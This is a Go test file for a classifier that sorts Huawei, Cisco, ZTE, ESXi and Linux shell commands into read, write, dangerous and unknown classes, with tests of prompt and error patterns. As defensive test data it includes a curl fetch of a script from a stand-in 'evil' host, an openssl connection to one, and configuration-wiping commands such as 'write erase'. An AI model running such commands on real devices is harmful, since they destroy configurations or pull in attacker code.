package driver

import (
	"strings"
	"testing"
)

type classCase struct {
	cmd  string
	want Class
}

func runClassCases(t *testing.T, drv Driver, cases []classCase) {
	t.Helper()
	for _, c := range cases {
		if got := drv.Classify(c.cmd); got != c.want {
			t.Errorf("%s.Classify(%q) = %v, want %v", drv.Key(), c.cmd, got, c.want)
		}
	}
}

func TestHuaweiClassify(t *testing.T) {
	drv, ok := For("huawei", "vrp8")
	if !ok {
		t.Fatal("huawei driver not found")
	}
	runClassCases(t, drv, []classCase{
		{"display version", Read},
		{"display current-configuration", Read},
		{"display clock", Read},
		{"  DISPLAY   interface  brief ", Read}, // normalization
		{"ping 10.1.1.1", Read},
		{"tracert 10.1.1.1", Read},
		{"screen-length 0 temporary", Read},
		{"quit", Read},
		{"system-view", Write},
		{"undo stp enable", Write},
		{"interface GigabitEthernet0/0/1", Write},
		{"save", Write},
		{"clear counters", Write}, // "clear" looks read-ish but mutates state
		{"reboot", Dangerous},
		{"reboot fast", Dangerous},
		{"delete /unreserved vrpcfg.zip", Dangerous},
		{"reset saved-configuration", Dangerous},
		{"format flash:", Dangerous},
		{"displayclock", Unknown}, // must not prefix-match "display"
		{"mystery-command arg", Unknown},
		{"", Unknown},
	})
}

func TestCiscoClassify(t *testing.T) {
	drv, ok := For("cisco", "ios")
	if !ok {
		t.Fatal("cisco driver not found")
	}
	runClassCases(t, drv, []classCase{
		{"show version", Read},
		{"show running-config", Read},
		{"show ip interface brief", Read},
		{"ping 10.1.1.1", Read},
		{"traceroute 10.1.1.1", Read},
		{"terminal length 0", Read},
		{"dir flash:", Read},
		{"configure terminal", Write},
		{"conf t", Write},
		{"no shutdown", Write},
		{"interface GigabitEthernet0/1", Write},
		{"write memory", Write},
		{"clear arp-cache", Write},
		{"debug ip packet", Write},
		{"reload", Dangerous},
		{"reload in 5", Dangerous},
		{"write erase", Dangerous}, // dangerous beats the "write" prefix
		{"erase startup-config", Dangerous},
		{"delete flash:old.bin", Dangerous},
		{"factory-reset all", Dangerous},
		{"showversion", Unknown},
		{"bizarre verb", Unknown},
	})
}

func TestForResolvesVariants(t *testing.T) {
	for _, c := range [][2]string{
		{"huawei", "vrp8"}, {"huawei", "VRP5"}, {"huawei", ""},
		{"cisco", "ios"}, {"cisco", "iosxe"}, {"cisco", "ios-xe"},
	} {
		if _, ok := For(c[0], c[1]); !ok {
			t.Fatalf("For(%q,%q) unexpectedly missing", c[0], c[1])
		}
	}
	if _, ok := For("zte", "zxr10"); !ok {
		t.Fatal("zte driver missing")
	}
}

// Prompt fixtures: real prompt shapes per view level. The session engine
// anchors these to the end of accumulated output.
func TestPromptFixtures(t *testing.T) {
	hw, _ := For("huawei", "vrp8")
	ci, _ := For("cisco", "ios")

	huaweiPrompts := []string{
		"<Huawei>",
		"<CORE-SW-01>",
		"[Huawei]",
		"[~CoreSW]",
		"[CORE-SW-GigabitEthernet0/0/1]",
		"[CORE-SW-aaa]",
	}
	for _, p := range huaweiPrompts {
		if !hw.Prompt().MatchString("\n" + p + " ") {
			t.Errorf("huawei prompt %q not matched", p)
		}
	}
	// Not prompts: output lines that merely contain brackets/angles.
	for _, p := range []string{"<meta> in the middle", "text [bracket] more"} {
		if hw.Prompt().MatchString("\n"+p+"\n") && strings.HasSuffix(p, "\n") {
			t.Errorf("huawei non-prompt %q matched", p)
		}
	}

	ciscoPrompts := []string{
		"Router>",
		"Router#",
		"CORE-SW-01#",
		"Router(config)#",
		"Router(config-if)#",
		"sw1(config-router-af)#",
	}
	for _, p := range ciscoPrompts {
		if !ci.Prompt().MatchString("\n" + p + " ") {
			t.Errorf("cisco prompt %q not matched", p)
		}
	}

	// Linux shells: Debian `user@host:~$`, RedHat bracket `[root@host ~]#`
	// (CentOS/RHEL/Rocky default PS1), bare root `#` — and the shapes that
	// must NOT read as prompts (log lines, text after the sigil).
	lx, _ := For("linux", "centos")
	linuxPrompts := []string{
		"ops@debian:~$",
		"root@ubuntu:~#",
		"[root@honest-fan-1 ~]#",
		"[admin@web01 /var/www]$",
		"[root@host-1 docker nginx]#",
		"#",
		"$",
	}
	for _, p := range linuxPrompts {
		if !lx.Prompt().MatchString("\n" + p + " ") {
			t.Errorf("linux prompt %q not matched", p)
		}
	}
	for _, p := range []string{
		"[root@honest-fan-1 ~]# echo hi", // trailing text after the sigil
		"root@ubuntu:~# hostname",
		"[WARN] task queue depth 3", // brackets but no user@host sigil ending
		"user@host:~",
	} {
		if lx.Prompt().MatchString("\n" + p + "\n") {
			t.Errorf("linux non-prompt %q matched", p)
		}
	}
}

func TestErrorFixtures(t *testing.T) {
	hw, _ := For("huawei", "vrp8")
	ci, _ := For("cisco", "ios")

	huaweiErrors := []string{
		"Error: Unrecognized command found at '^' position.",
		"Error:Wrong parameter found at '^' position.",
		"% Unrecognized command found at '^' position.",
	}
	for _, line := range huaweiErrors {
		matched := false
		for _, re := range hw.Errors() {
			if re.MatchString(line) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("huawei error line %q not matched", line)
		}
	}
	ciscoErrors := []string{
		"% Invalid input detected at '^' marker.",
		"% Incomplete command.",
		"% Ambiguous command:  \"sh ip\"",
	}
	for _, line := range ciscoErrors {
		matched := false
		for _, re := range ci.Errors() {
			if re.MatchString(line) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("cisco error line %q not matched", line)
		}
	}
	// A bare caret continuation is output framing, not an error verdict — the
	// engine must not rely on it, so no pattern should claim it as the
	// deciding line. (Patterns above may match the message lines only.)
}

func TestZTEClassify(t *testing.T) {
	drv, ok := For("zte", "zxr10")
	if !ok {
		t.Fatal("zte driver not found")
	}
	runClassCases(t, drv, []classCase{
		{"show version", Read},
		{"show running-config", Read},
		{"show interface brief", Read},
		{"ping 10.1.1.1", Read},
		{"traceroute 10.1.1.1", Read},
		{"terminal length 0", Read},
		{"configure terminal", Write},
		{"set port 1/5 disable", Write},
		{"interface gei-1/1", Write},
		{"no shutdown", Write},
		{"clear counters", Write},
		{"reboot", Dangerous},
		{"reload", Dangerous},
		{"delete flash:/old.cfg", Dangerous},
		{"write erase", Dangerous},
		{"mystery verb", Unknown},
		{"", Unknown},
	})
}

func TestZTEPromptFixtures(t *testing.T) {
	drv, _ := For("zte", "zxr10")
	for _, prompt := range []string{"ZXR10>", "ZXR10#", "ZXR10(config)#", "zxr-acc(config-if)#", "SW1(gei-1/1)#"} {
		if !drv.Prompt().MatchString("\n" + prompt + " ") {
			t.Errorf("zte prompt %q not matched", prompt)
		}
	}
	for _, line := range []string{
		"%Invalid input detected at '^' marker.",
		"% Ambiguous command:  \"sh\"",
		"%Error: invalid parameter",
		"Error: Wrong parameter",
	} {
		matched := false
		for _, re := range drv.Errors() {
			if re.MatchString(line) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("zte error line %q not matched", line)
		}
	}
}

// ESXi: the virtualization layer joins the seal — read table covers esxcli/
// esxcfg/vim-cmd reads, writes/dangerous (vim-cmd, host changes, kill) are
// proposal material or refused outright.
func TestEsxiClassify(t *testing.T) {
	d, ok := For("vmware", "esxi8")
	if !ok || d.Key() != "vmware-esxi" {
		t.Fatalf("resolve: ok=%v key=%v", ok, d.Key())
	}
	reads := []string{
		"esxcli network nic list", "esxcfg-vswitch -l", "vim-cmd vmsvc/getallvms",
		"vmkping 10.0.0.1", "esxcli network ip route list", "esxcli system version get",
	}
	for _, c := range reads {
		if got := d.Classify(c); got != Read {
			t.Errorf("read %q -> %v", c, got)
		}
	}
	writes := []string{
		"vim-cmd vmsvc/power.on 12", "esxcli network vswitch standard add -v vSwitch1",
		"esxcfg-vswitch -A 'VM Net' vSwitch0", "esxcli vm process kill -w hard -w 5",
	}
	for _, c := range writes {
		if got := d.Classify(c); got == Read {
			t.Errorf("write %q classified READ", c)
		}
	}
	if got := d.Classify("esxcli system shutdown -r"); got != Dangerous {
		t.Errorf("shutdown -> %v", got)
	}
	if got := d.Classify("curl http://evil/x.sh"); got != Unknown {
		t.Errorf("unknown tool -> %v", got)
	}
}

func TestLinuxShellClassify(t *testing.T) {
	drv, ok := For("linux", "")
	if !ok || drv.Key() != "linux-shell" {
		t.Fatalf("resolve: ok=%v key=%v", ok, drv.Key())
	}
	reads := []string{
		// software inventory — the blue-team fingerprint surface
		"dpkg -l", "dpkg --list", "dpkg-query -W -f=${Package} ${Version}\n",
		"rpm -qa", "rpm -qa --qf %{NAME} %{VERSION}\n", "rpm -q nginx",
		"pip list", "pip3 list --outdated", "pip freeze", "pip3 freeze",
		"java -version", "openssl version", "openssl version -a", "ssh -V",
		"nginx -v", "nginx -V", "apache2ctl -v", "apachectl -v", "httpd -v",
		// pre-existing families stay readable
		"ps aux", "systemctl status nginx", "docker ps", "cat /etc/os-release",
	}
	for _, c := range reads {
		if got := drv.Classify(c); got != Read {
			t.Errorf("read %q -> %v", c, got)
		}
	}
	refused := []string{
		// mutating package-manager forms must stay outside the whitelist
		"dpkg -r nginx", "dpkg --remove nginx", "dpkg --configure -a",
		"rpm -e nginx", "rpm -ivh pkg.rpm", "pip install requests", "pip3 uninstall requests",
		// other exec surfaces of the same binaries
		"java -jar app.jar", "openssl s_client -connect evil:443", "ssh root@10.0.0.1",
	}
	for _, c := range refused {
		if got := drv.Classify(c); got == Read {
			t.Errorf("mutating %q classified READ", c)
		}
	}
}
